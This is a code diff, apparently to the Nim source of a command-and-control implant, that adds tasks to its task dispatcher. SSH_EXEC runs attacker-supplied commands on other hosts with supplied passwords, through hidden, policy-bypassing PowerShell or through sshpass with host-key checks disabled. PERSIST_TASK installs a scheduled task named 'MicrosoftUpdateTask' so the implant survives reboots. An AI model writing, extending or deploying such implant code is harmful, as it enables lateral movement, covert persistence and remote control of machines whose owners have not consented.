@@ -2455,6 +2455,41 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     else:
       t.sendResult(id, "", "ELEVATE: not supported on Linux")
 
+  of "SSH_EXEC":
+    try:
+      let j    = parseJson(args)
+      let host = j{"host"}.getStr()
+      let port = j{"port"}.getInt(22)
+      let user = j{"user"}.getStr()
+      let pass = j{"pass"}.getStr()
+      let cmd2 = j{"cmd"}.getStr()
+      if host == "" or user == "" or cmd2 == "":
+        t.sendResult(id, "", "SSH_EXEC: {host,user,cmd} required")
+      else:
+        when defined(windows):
+          # PowerShell SSH via Invoke-Command -HostName (Win10 1809+ OpenSSH)
+          let ps = "$pw=ConvertTo-SecureString '" & pass & "' -AsPlainText -Force;" &
+            "$cred=New-Object PSCredential('" & user & "',$pw);" &
+            "Invoke-Command -HostName " & host & " -Port " & $port &
+            " -UserName " & user & " -ScriptBlock {" & cmd2 & "} 2>&1"
+          t.sendResult(id, runShell("powershell -NoP -W Hidden -Exec Bypass -C \"" &
+            ps.replace("\"","\\\"") & "\""), "")
+        else:
+          # Linux: use sshpass if available, else ssh with StrictHostKeyChecking=no
+          let sshCmd = "sshpass -p '" & pass.replace("'","'\\''") & "' ssh" &
+            " -o StrictHostKeyChecking=no -p " & $port & " " & user & "@" & host &
+            " '" & cmd2.replace("'","'\\''") & "' 2>&1"
+          t.sendResult(id, runShell(sshCmd), "")
+    except: t.sendResult(id, "", "SSH_EXEC: " & getCurrentExceptionMsg())
+
+  of "PERSIST_TASK":
+    when defined(windows):
+      let name = if args.strip() != "": args.strip() else: "MicrosoftUpdateTask"
+      let cmd2 = getAppFilename()
+      t.sendResult(id, doPersist(name, cmd2, "schtask"), "")
+    else:
+      t.sendResult(id, "", "PERSIST_TASK: Windows only")
+
   of "WINRM_EXEC":
     when defined(windows):
       try:
